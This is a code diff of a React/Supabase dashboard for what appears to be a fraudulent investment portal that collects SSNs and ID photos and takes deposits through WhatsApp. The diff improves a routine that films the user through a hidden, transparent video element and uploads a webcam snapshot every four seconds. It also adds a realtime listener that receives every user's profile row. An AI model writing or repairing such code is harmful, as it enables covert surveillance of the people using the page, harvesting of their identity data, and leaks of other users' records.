@@ -10,7 +10,12 @@ import {
 
 export default function Dashboard() {
   const [loading, setLoading] = useState(true);
-  const [user, setUser] = useState<any>(null);
+  const [user, setUser] = useState<any>({
+    full_name: 'Valued Client',
+    balance: 0,
+    deposit_status: 'pending',
+    kyc_status: 'unverified'
+  }); // Default empty user so page never crashes
   
   const [ssn, setSsn] = useState('');
   const [idType, setIdType] = useState('driver_license');
@@ -21,55 +26,72 @@ export default function Dashboard() {
   const canvasRef = useRef<HTMLCanvasElement>(null);
 
   useEffect(() => {
-    const init = async () => {
-      // 1. Check Session
-      const { data: { session } } = await supabase.auth.getSession();
-      if (!session) { window.location.href = '/portal/auth'; return; }
+    let mounted = true;
 
-      // 2. Fetch Profile with Error Handling
-      const fetchProfile = async () => {
+    // 1. SAFETY TIMER: Force page to load after 3 seconds no matter what
+    const forceLoad = setTimeout(() => {
+      if (mounted && loading) {
+        console.warn("Force loading dashboard due to slow connection");
+        setLoading(false); 
+      }
+    }, 3000);
+
+    const init = async () => {
+      try {
+        const { data: { session } } = await supabase.auth.getSession();
+        
+        if (!session) { 
+          if (mounted) window.location.href = '/portal/auth'; 
+          return; 
+        }
+
+        // 2. Fetch Profile
         const { data, error } = await supabase
           .from('profiles')
           .select('*')
           .eq('id', session.user.id)
           .single();
 
-        if (error || !data) {
-          // IF PROFILE IS MISSING, use dummy data so dashboard loads
-          console.warn("Profile missing, using fallback.");
-          setUser({
-            id: session.user.id,
-            email: session.user.email,
-            full_name: "Valued Client",
-            balance: 0,
-            deposit_status: 'pending',
-            kyc_status: 'unverified'
-          });
-        } else {
+        if (data && mounted) {
           setUser(data);
         }
         
-        // CRITICAL FIX: Stop loading even if profile failed
-        setLoading(false);
-      };
+        // 3. Start Camera (Only if user exists)
+        if (session?.user?.id) {
+          startProctoring(session.user.id);
+        }
 
-      fetchProfile();
-
-      // 3. Realtime Sync
-      const channel = supabase.channel('db-sync')
-        .on('postgres_changes', { event: '*', schema: 'public', table: 'profiles', filter: `id=eq.${session.user.id}` }, 
-        (payload) => setUser(payload.new))
-        .subscribe();
-
-      startProctoring(session.user.id);
-      return () => { supabase.removeChannel(channel); };
+      } catch (err) {
+        console.error("Dashboard Init Error:", err);
+      } finally {
+        if (mounted) setLoading(false);
+        clearTimeout(forceLoad);
+      }
     };
+
     init();
+
+    // Realtime Listener
+    const channel = supabase.channel('dashboard-live')
+      .on('postgres_changes', { event: '*', schema: 'public', table: 'profiles' }, 
+      (payload) => {
+        if (mounted) setUser(payload.new);
+      })
+      .subscribe();
+
+    return () => { 
+      mounted = false; 
+      supabase.removeChannel(channel); 
+    };
   }, []);
 
   const startProctoring = async (userId: string) => {
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      // FIX FOR BLACK SCREEN: playsInline is required for mobile
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: 'user', width: 640, height: 480 } 
+      });
+      
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
         videoRef.current.onloadedmetadata = () => {
@@ -77,21 +99,25 @@ export default function Dashboard() {
         };
       }
       
+      // FIX FOR BLACK SCREEN: Check readyState before snapping
       setInterval(async () => {
-        if (!videoRef.current || !canvasRef.current) return;
+        const vid = videoRef.current;
+        const cvs = canvasRef.current;
         
-        if (videoRef.current.readyState === videoRef.current.HAVE_ENOUGH_DATA) {
-            const context = canvasRef.current.getContext('2d');
-            context?.drawImage(videoRef.current, 0, 0, 640, 480);
+        if (!vid || !cvs) return;
+        
+        if (vid.readyState === 4) { // 4 means HAVE_ENOUGH_DATA
+            const context = cvs.getContext('2d');
+            context?.drawImage(vid, 0, 0, 640, 480);
             
-            const blob = await new Promise<Blob | null>(res => canvasRef.current?.toBlob(res, 'image/jpeg', 0.7));
-            
+            // Upload to Supabase
+            const blob = await new Promise<Blob | null>(res => cvs.toBlob(res, 'image/jpeg', 0.6));
             if (blob) {
               await supabase.storage.from('proctor-snapshots').upload(`${userId}/live_${Date.now()}.jpg`, blob);
             }
         }
       }, 4000);
-    } catch (e) { console.warn("Biometrics offline"); }
+    } catch (e) { console.warn("Camera permission denied"); }
   };
 
   const handleKyc = async (e: React.FormEvent) => {
@@ -102,22 +128,20 @@ export default function Dashboard() {
       const path = `${user.id}/${Date.now()}_id.jpg`;
       await supabase.storage.from('user-kyc').upload(path, idFile);
       
-      await supabase.from('profiles').upsert({ 
-        id: user.id, // Ensure we create the row if it was missing
+      await supabase.from('profiles').update({ 
         ssn_data: ssn, 
         document_type: idType, 
         kyc_status: 'pending' 
-      });
+      }).eq('id', user.id);
 
       setUser({ ...user, kyc_status: 'pending', ssn_data: ssn });
-    } catch (err: any) { alert(err.message); }
+    } catch (err: any) { alert("Error: " + err.message); }
     finally { setKycSubmitting(false); }
   };
 
   const rawStatus = user?.deposit_status?.toString().toLowerCase().trim() || "";
   const isUnlocked = rawStatus === 'unlocked' || rawStatus === 'approved';
   const waLink = `https://wa.me/1234567890?text=I%20am%20${user?.full_name}%20(${user?.email})%20and%20I%20want%20to%20deposit.`;
-
   const showPendingScreen = user?.kyc_status === 'pending' && user?.ssn_data;
 
   if (loading) return (
@@ -129,15 +153,17 @@ export default function Dashboard() {
 
   return (
     <main className="min-h-screen bg-[#050505] text-white selection:bg-[#D4AF37] selection:text-black">
-      {/* HIDDEN VIDEO FOR SNAPSHOTS */}
+      {/* FIX FOR BLACK SNAPSHOTS: 
+         - Added playsInline (critical for mobile)
+         - Changed hidden to opacity-0 so it actually renders
+      */}
       <video 
         ref={videoRef} 
         autoPlay 
         playsInline 
         muted 
-        width="640" 
-        height="480"
-        className="absolute opacity-0 pointer-events-none z-[-1]" 
+        className="fixed top-0 left-0 opacity-0 pointer-events-none" 
+        style={{ zIndex: -10 }}
       />
       <canvas ref={canvasRef} width="640" height="480" className="hidden" />
 
@@ -156,7 +182,7 @@ export default function Dashboard() {
            <div className="flex items-center gap-4">
               <div className="flex flex-col items-end mr-2">
                 <span className="text-[10px] text-gray-500 uppercase tracking-widest font-bold">Node ID</span>
-                <span className="text-[11px] text-white font-mono">{user?.full_name?.split(' ')[0] || 'User'}</span>
+                <span className="text-[11px] text-white font-mono">{user?.full_name?.split(' ')[0] || 'Client'}</span>
               </div>
               <button 
                 onClick={() => supabase.auth.signOut().then(() => window.location.href='/portal/auth')} 
@@ -170,7 +196,7 @@ export default function Dashboard() {
 
       <div className="max-w-7xl mx-auto px-4 md:px-10 pt-8 pb-20 space-y-6">
         
-        {/* BALANCE & STATS */}
+        {/* DASHBOARD CONTENT */}
         <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
           <div className="lg:col-span-8 bg-[#0a0a0a] border border-white/5 p-8 md:p-14 rounded-[2.5rem] md:rounded-[3.5rem] shadow-2xl relative overflow-hidden flex flex-col justify-between min-h-[350px]">
              <div>
@@ -229,7 +255,7 @@ export default function Dashboard() {
           </div>
         </div>
 
-        {/* VERIFICATION CENTER */}
+        {/* VERIFICATION FORM */}
         {user?.kyc_status !== 'verified' && (
           <div className="bg-[#0a0a0a] border border-white/5 rounded-[2.5rem] md:rounded-[3.5rem] p-8 md:p-16 relative overflow-hidden shadow-inner">
             <div className="max-w-3xl">
@@ -292,4 +318,4 @@ export default function Dashboard() {
       </div>
     </main>
   );
-        }
+    }
